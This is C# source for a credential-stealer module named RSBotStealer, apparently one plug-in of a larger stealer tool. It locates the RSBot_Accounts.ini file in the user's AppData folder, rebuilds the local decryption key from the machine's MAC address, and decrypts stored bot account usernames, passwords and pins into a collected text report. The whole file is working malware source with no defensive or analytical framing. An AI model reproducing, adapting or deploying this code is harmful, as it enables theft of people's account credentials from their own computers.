#region Imports

using System;
using System.Collections;
using System.Collections.Generic;
using System.Globalization;
using System.IO;
using System.Management;
using System.Net.NetworkInformation;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using sub.Util.Misc;

#endregion

namespace sub.Stealers
{
    internal class RSBotStealer : IStealer
    {
        private const string SettingsFileName = "RSBot_Accounts.ini";
        private string _name = "RSBotStealer";

        private string _settingsFile = Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), SettingsFileName);

        #region IStealer Members

        public string Name
        {
            get { return _name; }
            set { _name = value; }
        }

        public string Data { get; set; }

        public void Collect()
        {
            IEnumerable<RSBotAccount> accounts = GetLocalAccounts(GetLocalKey());
            Data += "RSBot Account Stealer\r\n\r\n";
            foreach (RSBotAccount acc in accounts)
            {
                Data += "Username: " + acc.UserName + ", Password: " + acc.Password + ", Pin: " + acc.Pin + "\r\n";
            }
        }

        #endregion

        private IEnumerable<RSBotAccount> GetLocalAccounts(byte[] key)
        {
            using (StreamReader reader = new StreamReader(_settingsFile))
            {
                return GetLocalAccounts(reader.ReadToEnd(), key);
            }
        }

        private IEnumerable<RSBotAccount> GetLocalAccounts(string accountFileData, byte[] key)
        {
            ArrayList usernames = new ArrayList();
            ArrayList passwords = new ArrayList();
            ArrayList pins = new ArrayList();

            Regex pat = new Regex(@"(?<=\[)[A-Za-z0-9_]{1,12}(?=\])");
            MatchCollection matches = pat.Matches(accountFileData);
            foreach (Match m in matches)
            {
                usernames.Add(m.Value);
            }

            Regex passpat = new Regex(@"(?<=password\=)[a0-9-]{1,50}");
            MatchCollection passmatches = passpat.Matches(accountFileData);
            foreach (Match m in passmatches)
            {
                passwords.Add(m.Value);
            }

            List<RSBotAccount> ret = new List<RSBotAccount>();
            foreach (string user in usernames)
            {
                int idx = usernames.IndexOf(user);
                const string emp = "None";

                string pass = idx < passwords.Count ? DecryptPassword(passwords[idx].ToString(), key) : emp;
                string pin = idx < pins.Count ? DecryptPassword(pins[idx].ToString(), key) : emp;
                if (string.IsNullOrEmpty(pass) && pass != emp)
                {
                    pass = DecryptPassword(pass, key);
                }
                ret.Add(new RSBotAccount(user, pass, pin));
            }
            return ret.ToArray();
        }

        private byte[] GetLocalKey()
        {
            NetworkInterface[] allNetworkInterfaces = NetworkInterface.GetAllNetworkInterfaces();
            int num = -1;
            int index = -1;
            int num4 = allNetworkInterfaces.Length - 1;
            for (int i = 0; i <= num4; i++)
            {
                if (allNetworkInterfaces[i].OperationalStatus == OperationalStatus.Up)
                {
                    IPInterfaceProperties iPProperties = allNetworkInterfaces[i].GetIPProperties();
                    if (iPProperties != null)
                    {
                        IPv4InterfaceProperties properties2 = iPProperties.GetIPv4Properties();
                        if ((properties2 != null) && ((index < 0) || (properties2.Index < index)))
                        {
                            num = i;
                            index = properties2.Index;
                        }
                    }
                }
            }
            byte[] buffer2 = ConvertByteEncoding((byte[]) Mac(GetMACAddress()));
            if (num >= 0)
            {
                return buffer2;
            }
            return Encoding.Default.GetBytes(Environment.UserName + CultureInfo.CurrentCulture.TwoLetterISOLanguageName);
        }


        private byte[] ConvertByteEncoding(byte[] key)
        {
            byte[] destinationArray = new byte[(key.Length - 1) + 1];
            Array.Copy(key, destinationArray, key.Length);
            int num2 = destinationArray.Length - 1;
            for (int i = 0; i <= num2; i++)
            {
                if (!IsValidIso88591(destinationArray[i]))
                {
                    destinationArray[i] = 0x3f;
                }
            }
            return destinationArray;
        }

        internal string GetMACAddress()
        {
            ManagementObjectCollection instances =
                new ManagementClass("Win32_NetworkAdapterConfiguration").GetInstances();
            string str2 = string.Empty;
            foreach (ManagementObject obj2 in instances)
            {
                if (!str2.Equals(string.Empty)) continue;
                if (Convert.ToBoolean(obj2["IPEnabled"]))
                {
                    str2 = obj2["MacAddress"].ToString().Replace(":", "");
                }
                obj2.Dispose();
            }
            return str2;
        }


        private bool IsValidIso88591(byte value)
        {
            return (value <= 0x7f) || (value >= 160);
        }


        public static object Mac(string ino)
        {
            byte[] bytes =
                BitConverter.GetBytes(long.Parse(ino, NumberStyles.HexNumber, CultureInfo.CurrentCulture.NumberFormat));
            Array.Reverse(bytes);
            byte[] buffer = new byte[6];
            int index = 0;
            do
            {
                buffer[index] = bytes[index + 2];
                index++;
            } while (index <= 5);
            return buffer;
        }


        private static sbyte ToSByte(byte b)
        {
            return (sbyte) b;
        }


        public static string DecryptPassword(string passwordHash, byte[] key)
        {
            byte[] array;
            using (SHA1 sha = SHA1.Create())
            {
                array = sha.ComputeHash(key);
            }
            sbyte[] numArray = Array.ConvertAll(array, ToSByte);
            string[] strArray = passwordHash.Split(new char[] {'a'});

            byte[] bytes = new byte[(strArray.Length - 1) + 1];
            int index = 0;
            while (index < array.Length)
            {
                int result;
                int.TryParse(strArray[index], out result);
                sbyte num3 = (sbyte) result;
                if (num3 == numArray[index])
                {
                    break;
                }
                bytes[index] = (byte) ((sbyte) (num3 - numArray[index]));
                index++;
            }
            return Encoding.Default.GetString(bytes, 0, index);
        }

        #region Nested type: RSBotAccount

        internal class RSBotAccount
        {
            public string Password;
            public string Pin;
            public string UserName;

            public RSBotAccount(string user, string pass, string pin)
            {
                UserName = user;
                Password = pass;
                Pin = pin;
            }
        }

        #endregion
    }
}